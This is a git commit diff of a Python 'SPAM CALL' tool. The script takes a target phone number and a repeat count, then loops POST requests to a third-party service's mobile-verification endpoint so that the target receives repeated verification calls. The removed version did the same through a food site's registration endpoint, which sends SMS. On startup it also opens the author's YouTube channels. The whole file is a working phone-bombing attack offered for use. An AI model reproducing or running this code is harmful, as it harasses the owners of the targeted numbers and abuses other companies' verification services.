65d957477ff1fa47387492d010c9b313d15875fc
TheDemon <108716811+THEMOON555@users.noreply.github.com>
2022-07-05 22:02:33 +0800

    Update W-Xx1.py

--- W-Xx1.py
+++ W-Xx1.py
@@ -1,20 +1,69 @@
 
-import requests,json,os,sys
-print (""" \033[91m╔╗╔╗╔╦═══╦╗╔═╦╗─╔╦╗──╔══╦═╗─╔╦═══╦═══╗
- \033[91m║║║║║║╔═╗║║║╔╣║─║║║──╚╣╠╣║╚╗║║╔══╣╔═╗║
- \033[94m║║║║║║║─║║╚╝╝║║─║║║───║║║╔╗╚╝║╚══╣╚═╝║
- \033[91m║╚╝╚╝║╚═╝║╔╗║║║─║║║─╔╗║║║║╚╗║║╔══╣╔╗╔╝
- \033[97m╚╗╔╗╔╣╔═╗║║║╚╣╚═╝║╚═╝╠╣╠╣║─║║║╚══╣║║╚╗
- \033[92m─╚╝╚╝╚╝─╚╩╝╚═╩═══╩═══╩══╩╝─╚═╩═══╩╝╚═╝
- \033[93mAUTOR    =DEMOZXX """)
-yu = input(' target number (ex:088118) ; ')
-eek = int(input('the amount : '))
-hd  = {'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}
-dat = {'nama':'Anker+Produc','email_register':'anker11%40gmail.com','hp':yu,'ulang_tahun':'01%2F01%2F1975','pass':'ankerproduction123','jns_kelamin':'1'}
-for x in range(eek):
- ho = requests.post('https://www.wakuliner.com/main/reg13',headers=hd,data=dat)
- kntl = json.loads(ho.text)
- if kntl["status"] == 1:
-    print("successfully sent no "+yu)
- else:
-    print("Failed to send no "+yu)
+# Mau gua Marshal kagak jadi
+import os,sys,time,requests
+from time import sleep
+
+a,m,h,k,b,u,bm,p,bn,o = [
+'\033[90m',
+'\033[31m',
+'\033[32m',
+'\033[33m',
+'\033[94m',
+'\033[35m',
+'\033[36m',
+'\033[37m',
+'\033[41m',
+'\033[0m'
+]
+
+#mengetik otomatis
+def mengetik(z):
+    for e in z + "\n":
+      sys.stdout.write(e)
+      sys.stdout.flush()
+      time.sleep(0.05)
+
+os.system('clear')
+print ('\033[36;1mSubscribe yt ku ngab \033[37mMisterAM \033[36mok! :v')
+os.system('termux-open-url https://youtube.com/channel/UCXk4vbvDl7i6dxWBtNdpx6w')
+sleep(5)
+os.system('clear')
+print ('\033[36;1mSubs juga chanelnya \033[37;1myg ngasih source ngab :v')
+os.system('xdg-open https://youtube.com/channel/UCRaVHUXQGVAH7Gof7kixIoQ')
+sleep(3)
+os.system('clear')
+# Ubah Terserah kalian
+banner= """
+\033[31;1m ███████╗██████╗  █████╗ ███╗   ███╗ \033[31;1m ╔██████╗ █████╗ ██╗     ██╗
+\033[31;1m ██╔════╝██╔══██╗██╔══██╗████╗ ████║ \033[31;1m ██╔════╝██╔══██╗██║     ██║
+\033[31;1m ███████╗██████╔╝███████║██╔████╔██║ \033[31;1m ██║     ███████║██║     ██║
+\033[37;1m ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║ \033[37;1m ██║     ██╔══██║██║     ██║
+\033[37;1m ███████║██║     ██║  ██║██║ ╚═╝ ██║ \033[37;1m ╚██████╗██║  ██║███████╗███████╗
+\033[37;1m ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ \033[37;1m  ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝
+\033[33;1m╔════════════════════════════════════════════════╗
+\033[33;1m║  \033[36;1m [X] Authour : DEMONZxxV1                    \033[33;1m ║
+\033[33;1m║  \033[36;1m [X] gitHub  : https:github.com/THEMOON555   \033[33;1m ║
+\033[33;1m╚════════════════════════════════════════════════╝
+\033[36;1m╔═══════════════════════════╗
+\033[36;1m║\033[33;1m Use this Tool Well \033[36;1m ║
+\033[36;1m╚═══════════════════════════╝"""
+sleep(1)
+print(banner)
+# Jaggan di ubah sayang
+print ("")
+print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m Number Choice \033[1;33m• \033[0m\033[1;30m]══════════════>")
+print ("")
+print ("\033[37m[\033[31m•\033[37m]\033[32m Example number \033[37m : \033[37m\033[33m8Xxx\033[33m")
+nomor = input("\033[37m[\033[31m•\033[37m]\033[32m Target Number \033[32m \033[37m:\033[37m\033[33m ")
+print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m amount  \033[1;33m• \033[0m\033[1;30m]══════════════>")
+jumlah = int(input("\033[37m[\033[31m•\033[37m]\033[32m Amount spam \033[37m :\033[37m\033[33m "))
+mengetik("[KALO SUDAH LIMIT TUNGUH BEBERAPA MENIT LAGI BARU ULANGI NGAB :V] ")
+time.sleep(3)
+# Jaggan di ubah sayang ku
+url = "https://id.jagreward.com/member/verify-mobile/"
+ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
+dat = {"method": "CALL","countryCode": "id",}
+# Jaggan di ubah sayng
+for i in range(jumlah):
+    send = requests.post(url+nomor, headers=ua, data=dat)
+    print(" [â€¢] Status ~+> ",(send.json()["message"]))
